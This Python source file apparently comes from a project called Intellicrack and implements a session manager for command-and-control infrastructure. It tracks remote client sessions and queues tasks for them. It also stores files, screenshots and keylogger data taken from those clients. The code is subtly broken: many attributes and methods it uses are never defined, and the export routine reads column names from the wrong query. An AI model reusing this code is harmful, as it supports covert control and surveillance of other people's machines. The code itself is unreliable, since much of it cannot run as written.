"""This file is part of Intellicrack.
Copyright (C) 2025 Zachary Flint

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

"""
Session Manager for C2 Infrastructure

Manages C2 sessions, task queuing, file transfers,
and session persistence for command and control operations.
"""

import json
import logging
import os
import shutil
import sqlite3
import threading
import time
import uuid
from pathlib import Path
from typing import Any

logger = logging.getLogger(__name__)

# Project root and data directory configuration
PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent.parent
DATA_DIR = PROJECT_ROOT / "data"
UPLOAD_DIR = DATA_DIR / "c2_uploads"
DOWNLOAD_DIR = DATA_DIR / "c2_downloads"
DB_PATH = DATA_DIR / "c2_sessions.db"

def migrate_resource_if_needed(old_path: str, new_path: Path):
    """Checks for a resource at the old path. If found, moves it to the new path.
    Logs a warning about the migration.
    """
    old_path_obj = Path(old_path)
    if old_path_obj.exists() and not new_path.exists():
        logger.warning(
            f"Legacy path detected. Migrating '{old_path}' to '{new_path}'. "
            "This is a one-time operation.",
        )
        try:
            # Ensure parent directory of the new path exists
            new_path.parent.mkdir(parents=True, exist_ok=True)
            shutil.move(str(old_path_obj), str(new_path))
        except Exception as e:
            logger.error(f"Could not migrate '{old_path}' to '{new_path}': {e}")
            raise


class Session:
    """Represents a C2 session with a client."""

    def __init__(self, session_id: str, connection_info: dict[str, Any]):
        """Initialize a C2 session with client connection information."""
        self.session_id = session_id
        self.connection_info = connection_info
        self.created_at = time.time()
        self.last_seen = self.created_at
        self.status = "active"
        self.commands_sent = 0
        self.commands_received = 0
        self.data_sent = 0
        self.data_received = 0
        self.logger = logging.getLogger(__name__)

        # Session metadata
        self.metadata = {
            "os": connection_info.get("os", "unknown"),
            "arch": connection_info.get("arch", "unknown"),
            "hostname": connection_info.get("hostname", "unknown"),
            "user": connection_info.get("user", "unknown"),
            "privileges": connection_info.get("privileges", "user"),
            "ip_address": connection_info.get("ip", "unknown"),
            "user_agent": connection_info.get("user_agent", "unknown"),
        }

        # Command history
        self.command_history: list[dict[str, Any]] = []

        # Active tasks
        self.active_tasks: dict[str, Any] = {}

        self.logger.info(f"New session created: {session_id}")

        # Update last seen
        self.update_last_seen()

    def update_last_seen(self):
        """Update last seen timestamp."""
        self.last_seen = time.time()
        self.stats["last_beacon"] = self.last_seen

    def add_task(self, task: dict[str, Any]):
        """Add task to session queue."""
        task["created_at"] = time.time()
        task["status"] = "pending"
        self.tasks.append(task)
        self.stats["total_tasks"] += 1

    def update_task_status(self, task_id: str, status: str, result: Any = None):
        """Update task status and result."""
        for task in self.tasks:
            if task.get("task_id") == task_id:
                task["status"] = status
                task["completed_at"] = time.time()
                if result is not None:
                    task["result"] = result

                if status == "completed":
                    self.stats["successful_tasks"] += 1
                elif status == "failed":
                    self.stats["failed_tasks"] += 1
                break

    def get_pending_tasks(self) -> list[dict[str, Any]]:
        """Get list of pending tasks."""
        return [task for task in self.tasks if task.get("status") == "pending"]

    def to_dict(self) -> dict[str, Any]:
        """Convert session to dictionary representation."""
        return {
            "session_id": self.session_id,
            "connection_info": self.connection_info,
            "created_at": self.created_at,
            "last_seen": self.last_seen,
            "status": self.status,
            "client_info": self.client_info,
            "capabilities": self.capabilities,
            "stats": self.stats,
            "uptime": time.time() - self.created_at,
            "task_count": len(self.tasks),
            "pending_tasks": len(self.get_pending_tasks()),
        }


class SessionManager:
    """Advanced session manager for C2 infrastructure.

    Handles session lifecycle, task management, file transfers,
    and persistent storage of session data.
    """

    def __init__(self, db_path: str = None):
        """Initialize the session manager with database and directory configuration."""
        self.db_path = db_path or os.path.join(
            os.path.dirname(__file__), "..", "..", "data", "sessions.db",
        )
        self.logger = logging.getLogger(__name__)

        # Ensure database directory exists
        db_dir = os.path.dirname(self.db_path)
        if not os.path.exists(db_dir):
            os.makedirs(db_dir, exist_ok=True)

        # Active sessions
        self.sessions: dict[str, Session] = {}

        # Session configuration
        self.config = {
            "session_timeout": 3600,  # 1 hour
            "max_sessions": 1000,
            "cleanup_interval": 300,  # 5 minutes
            "heartbeat_interval": 60,  # 1 minute
            "max_command_history": 100,
        }

        # Threading
        self.lock = threading.RLock()
        self.cleanup_thread = None
        self.running = False

        # Statistics
        self.stats = {
            "total_sessions": 0,
            "active_sessions": 0,
            "expired_sessions": 0,
            "total_commands": 0,
        }

        # Initialize database
        self._initialize_database()

        # Load existing sessions
        self._load_sessions()

        # Start cleanup thread
        self.start_cleanup()

        self.logger.info(f"Session manager initialized with database: {self.db_path}")

    def _ensure_directories(self):
        """Ensure upload/download directories exist."""
        try:
            # Ensure data directory and subdirectories exist
            DATA_DIR.mkdir(parents=True, exist_ok=True)
            UPLOAD_DIR.mkdir(parents=True, exist_ok=True)
            DOWNLOAD_DIR.mkdir(parents=True, exist_ok=True)
        except Exception as e:
            self.logger.error(f"Failed to create directories: {e}")

    def _initialize_database(self):
        """Initialize SQLite database for session persistence."""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            # Sessions table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS sessions (
                    session_id TEXT PRIMARY KEY,
                    connection_info TEXT,
                    client_info TEXT,
                    capabilities TEXT,
                    created_at REAL,
                    last_seen REAL,
                    status TEXT,
                    stats TEXT
                )
            """)

            # Tasks table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS tasks (
                    task_id TEXT PRIMARY KEY,
                    session_id TEXT,
                    task_type TEXT,
                    task_data TEXT,
                    status TEXT,
                    result TEXT,
                    created_at REAL,
                    completed_at REAL,
                    FOREIGN KEY (session_id) REFERENCES sessions (session_id)
                )
            """)

            # Files table
            cursor.execute("""
                CREATE TABLE IF NOT EXISTS files (
                    file_id TEXT PRIMARY KEY,
                    session_id TEXT,
                    filename TEXT,
                    file_path TEXT,
                    file_size INTEGER,
                    file_hash TEXT,
                    upload_time REAL,
                    file_type TEXT,
                    FOREIGN KEY (session_id) REFERENCES sessions (session_id)
                )
            """)

            conn.commit()
            conn.close()

            self.logger.info("Session database initialized")

        except Exception as e:
            self.logger.error(f"Failed to initialize database: {e}")

    async def create_session(self, connection_info: dict[str, Any]) -> Session:
        """Create a new C2 session."""
        try:
            session_id = str(uuid.uuid4())
            session = Session(session_id, connection_info)

            # Store session
            self.sessions[session_id] = session

            # Update statistics
            self.stats["total_sessions"] += 1
            self.stats["active_sessions"] = len([s for s in self.sessions.values() if s.status == "active"])

            # Persist to database
            await self._persist_session(session)

            self.logger.info(f"Created new session: {session_id}")
            return session

        except Exception as e:
            self.logger.error(f"Failed to create session: {e}")
            raise

    def get_session(self, session_id: str) -> Session | None:
        """Get session by ID."""
        return self.sessions.get(session_id)

    def get_active_sessions(self) -> list[dict[str, Any]]:
        """Get list of active sessions."""
        try:
            active_sessions = []
            for session in self.sessions.values():
                if session.status == "active":
                    active_sessions.append(session.to_dict())
            return active_sessions
        except Exception as e:
            self.logger.error(f"Error getting active sessions: {e}")
            return []

    async def mark_session_inactive(self, session_id: str):
        """Mark session as inactive."""
        try:
            if session_id in self.sessions:
                session = self.sessions[session_id]
                session.status = "inactive"

                # Move to history
                self.session_history.append(session.to_dict())

                # Update statistics
                self.stats["active_sessions"] = len([s for s in self.sessions.values() if s.status == "active"])

                # Persist change
                await self._persist_session(session)

                self.logger.info(f"Marked session {session_id} as inactive")

        except Exception as e:
            self.logger.error(f"Failed to mark session inactive: {e}")

    async def update_session_info(self, session_id: str, client_info: dict[str, Any]):
        """Update session client information."""
        try:
            if session_id in self.sessions:
                session = self.sessions[session_id]
                session.client_info.update(client_info)
                session.update_last_seen()

                # Extract capabilities if provided
                if "capabilities" in client_info:
                    session.capabilities = client_info["capabilities"]

                # Persist changes
                await self._persist_session(session)

                self.logger.debug(f"Updated session info for {session_id}")

        except Exception as e:
            self.logger.error(f"Failed to update session info: {e}")

    async def create_task(self, session_id: str, task_type: str, task_data: dict[str, Any]) -> dict[str, Any]:
        """Create a new task for a session."""
        try:
            task_id = str(uuid.uuid4())

            task = {
                "task_id": task_id,
                "session_id": session_id,
                "type": task_type,
                "data": task_data,
                "status": "pending",
                "created_at": time.time(),
                "priority": task_data.get("priority", "normal"),
            }

            # Add to session
            if session_id in self.sessions:
                self.sessions[session_id].add_task(task)

            # Add to pending tasks
            self.pending_tasks[session_id].append(task)

            # Persist task
            await self._persist_task(task)

            # Update statistics
            self.stats["total_tasks"] += 1

            self.logger.info(f"Created task {task_id} for session {session_id}")
            return task

        except Exception as e:
            self.logger.error(f"Failed to create task: {e}")
            raise

    async def get_pending_tasks(self, session_id: str) -> list[dict[str, Any]]:
        """Get pending tasks for a session."""
        try:
            if session_id in self.sessions:
                session = self.sessions[session_id]
                return session.get_pending_tasks()
            return []
        except Exception as e:
            self.logger.error(f"Error getting pending tasks: {e}")
            return []

    async def mark_task_sent(self, task_id: str):
        """Mark task as sent to client."""
        try:
            # Find and update task in sessions
            for session in self.sessions.values():
                for task in session.tasks:
                    if task.get("task_id") == task_id:
                        task["status"] = "sent"
                        task["sent_at"] = time.time()
                        break

            # Update in database
            await self._update_task_status(task_id, "sent")

        except Exception as e:
            self.logger.error(f"Failed to mark task as sent: {e}")

    async def store_task_result(self, task_id: str, result: Any, success: bool):
        """Store task execution result."""
        try:
            status = "completed" if success else "failed"

            # Update in sessions
            for session in self.sessions.values():
                session.update_task_status(task_id, status, result)

            # Store result
            self.task_results[task_id] = {
                "result": result,
                "success": success,
                "timestamp": time.time(),
            }

            # Update in database
            await self._update_task_result(task_id, status, result)

            self.logger.info(f"Stored result for task {task_id}: {status}")

        except Exception as e:
            self.logger.error(f"Failed to store task result: {e}")

    async def store_uploaded_file(self, session_id: str, filename: str, file_data: bytes):
        """Store uploaded file from client."""
        try:
            file_id = str(uuid.uuid4())
            safe_filename = self._sanitize_filename(filename)
            file_path = os.path.join(self.upload_directory, f"{session_id}_{safe_filename}")

            # Write file to disk
            with open(file_path, "wb") as f:
                f.write(file_data)

            # Calculate file hash
            import hashlib
            file_hash = hashlib.sha256(file_data).hexdigest()

            # Store file info
            file_info = {
                "file_id": file_id,
                "session_id": session_id,
                "filename": filename,
                "file_path": file_path,
                "file_size": len(file_data),
                "file_hash": file_hash,
                "upload_time": time.time(),
                "file_type": "upload",
            }

            # Add to session
            if session_id in self.sessions:
                session = self.sessions[session_id]
                session.files[file_id] = file_info
                session.stats["bytes_uploaded"] += len(file_data)

            # Persist to database
            await self._persist_file(file_info)

            # Update statistics
            self.stats["total_files"] += 1
            self.stats["total_data_transfer"] += len(file_data)

            self.logger.info(f"Stored uploaded file: {filename} ({len(file_data)} bytes)")

        except Exception as e:
            self.logger.error(f"Failed to store uploaded file: {e}")

    async def store_screenshot(self, session_id: str, screenshot_data: bytes, timestamp: float):
        """Store screenshot from client."""
        try:
            filename = f"screenshot_{int(timestamp)}.png"
            await self.store_uploaded_file(session_id, filename, screenshot_data)

        except Exception as e:
            self.logger.error(f"Failed to store screenshot: {e}")

    async def store_keylog_data(self, session_id: str, keylog_data: str, timestamp: float):
        """Store keylog data from client."""
        try:
            filename = f"keylog_{int(timestamp)}.txt"
            await self.store_uploaded_file(session_id, filename, keylog_data.encode("utf-8"))

        except Exception as e:
            self.logger.error(f"Failed to store keylog data: {e}")

    async def cleanup_all_sessions(self):
        """Cleanup all sessions and resources."""
        try:
            for session_id in list(self.sessions.keys()):
                await self.mark_session_inactive(session_id)

            self.logger.info("Cleaned up all sessions")

        except Exception as e:
            self.logger.error(f"Error cleaning up sessions: {e}")

    def get_statistics(self) -> dict[str, Any]:
        """Get session manager statistics."""
        try:
            # Update active session count
            self.stats["active_sessions"] = len([s for s in self.sessions.values() if s.status == "active"])

            # Add detailed statistics
            detailed_stats = self.stats.copy()
            detailed_stats.update({
                "session_history_count": len(self.session_history),
                "pending_task_count": sum(len(tasks) for tasks in self.pending_tasks.values()),
                "task_result_count": len(self.task_results),
                "average_session_uptime": self._calculate_average_uptime(),
                "most_active_session": self._get_most_active_session(),
            })

            return detailed_stats

        except Exception as e:
            self.logger.error(f"Error getting statistics: {e}")
            return self.stats

    def _calculate_average_uptime(self) -> float:
        """Calculate average session uptime."""
        try:
            if not self.sessions:
                return 0.0

            total_uptime = sum(
                time.time() - session.created_at
                for session in self.sessions.values()
            )

            return total_uptime / len(self.sessions)

        except Exception as e:
            self.logger.error(f"Error calculating average uptime: {e}")
            return 0.0

    def _get_most_active_session(self) -> str | None:
        """Get ID of most active session."""
        try:
            if not self.sessions:
                return None

            most_active = max(
                self.sessions.values(),
                key=lambda s: s.stats["total_tasks"],
            )

            return most_active.session_id

        except Exception as e:
            self.logger.error(f"Error getting most active session: {e}")
            return None

    def _sanitize_filename(self, filename: str) -> str:
        """Sanitize filename for safe storage."""
        import os
        import re

        # Get just the basename to prevent path traversal
        filename = os.path.basename(filename)

        # Remove any remaining path separators and dangerous characters
        safe_filename = re.sub(r'[<>:"/\\|?*\x00-\x1f]', "_", filename)

        # Remove any leading dots to prevent hidden files
        safe_filename = safe_filename.lstrip(".")

        # Ensure filename is not empty
        if not safe_filename:
            safe_filename = "unnamed_file"

        # Remove any directory traversal attempts
        safe_filename = safe_filename.replace("..", "_")

        return safe_filename[:255]  # Limit length

    async def _persist_session(self, session: Session):
        """Persist session to database."""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            cursor.execute("""
                INSERT OR REPLACE INTO sessions
                (session_id, connection_info, client_info, capabilities,
                 created_at, last_seen, status, stats)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                session.session_id,
                json.dumps(session.connection_info),
                json.dumps(session.client_info),
                json.dumps(session.capabilities),
                session.created_at,
                session.last_seen,
                session.status,
                json.dumps(session.stats),
            ))

            conn.commit()
            conn.close()

        except Exception as e:
            self.logger.error(f"Failed to persist session: {e}")

    async def _persist_task(self, task: dict[str, Any]):
        """Persist task to database."""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            cursor.execute("""
                INSERT INTO tasks
                (task_id, session_id, task_type, task_data, status, created_at)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                task["task_id"],
                task["session_id"],
                task["type"],
                json.dumps(task["data"]),
                task["status"],
                task["created_at"],
            ))

            conn.commit()
            conn.close()

        except Exception as e:
            self.logger.error(f"Failed to persist task: {e}")

    async def _update_task_status(self, task_id: str, status: str):
        """Update task status in database."""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            cursor.execute("""
                UPDATE tasks SET status = ? WHERE task_id = ?
            """, (status, task_id))

            conn.commit()
            conn.close()

        except Exception as e:
            self.logger.error(f"Failed to update task status: {e}")

    async def _update_task_result(self, task_id: str, status: str, result: Any):
        """Update task result in database."""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            cursor.execute("""
                UPDATE tasks
                SET status = ?, result = ?, completed_at = ?
                WHERE task_id = ?
            """, (status, json.dumps(result), time.time(), task_id))

            conn.commit()
            conn.close()

        except Exception as e:
            self.logger.error(f"Failed to update task result: {e}")

    async def _persist_file(self, file_info: dict[str, Any]):
        """Persist file information to database."""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            cursor.execute("""
                INSERT INTO files
                (file_id, session_id, filename, file_path, file_size,
                 file_hash, upload_time, file_type)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                file_info["file_id"],
                file_info["session_id"],
                file_info["filename"],
                file_info["file_path"],
                file_info["file_size"],
                file_info["file_hash"],
                file_info["upload_time"],
                file_info["file_type"],
            ))

            conn.commit()
            conn.close()

        except Exception as e:
            self.logger.error(f"Failed to persist file info: {e}")

    async def load_sessions_from_database(self):
        """Load sessions from database on startup."""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            cursor.execute('SELECT * FROM sessions WHERE status = "active"')
            rows = cursor.fetchall()

            for row in rows:
                session_id = row[0]
                connection_info = json.loads(row[1])

                # Recreate session object
                session = Session(session_id, connection_info)
                session.client_info = json.loads(row[2])
                session.capabilities = json.loads(row[3])
                session.created_at = row[4]
                session.last_seen = row[5]
                session.status = row[6]
                session.stats = json.loads(row[7])

                self.sessions[session_id] = session

            conn.close()

            self.logger.info(f"Loaded {len(rows)} sessions from database")

        except Exception as e:
            self.logger.error(f"Failed to load sessions from database: {e}")

    async def export_session_data(self, session_id: str) -> dict[str, Any] | None:
        """Export all data for a session."""
        try:
            if session_id not in self.sessions:
                return None

            session = self.sessions[session_id]

            # Get tasks from database
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()

            cursor.execute("SELECT * FROM tasks WHERE session_id = ?", (session_id,))
            task_rows = cursor.fetchall()

            cursor.execute("SELECT * FROM files WHERE session_id = ?", (session_id,))
            file_rows = cursor.fetchall()

            conn.close()

            export_data = {
                "session": session.to_dict(),
                "tasks": [dict(zip([col[0] for col in cursor.description], row, strict=False)) for row in task_rows],
                "files": [dict(zip([col[0] for col in cursor.description], row, strict=False)) for row in file_rows],
                "export_time": time.time(),
            }

            return export_data

        except Exception as e:
            self.logger.error(f"Failed to export session data: {e}")
            return None
